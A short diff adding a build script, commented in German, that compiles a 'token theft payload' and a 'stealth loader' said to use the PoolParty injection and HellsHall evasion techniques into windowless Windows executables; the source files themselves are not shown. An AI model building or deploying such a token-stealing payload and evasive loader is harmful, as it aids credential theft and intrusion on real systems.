@@ -1,0 +1,5 @@
+# 1. Token Theft Payload kompilieren
+csc /unsafe /platform:x64 /target:winexe /out:TokenTheft.exe TokenTheftPayload.cs
+
+# 2. Loader (mit PoolParty und HellsHall) kompilieren
+csc /unsafe /platform:x64 /target:winexe /out:loader.exe StealthLoader.cs
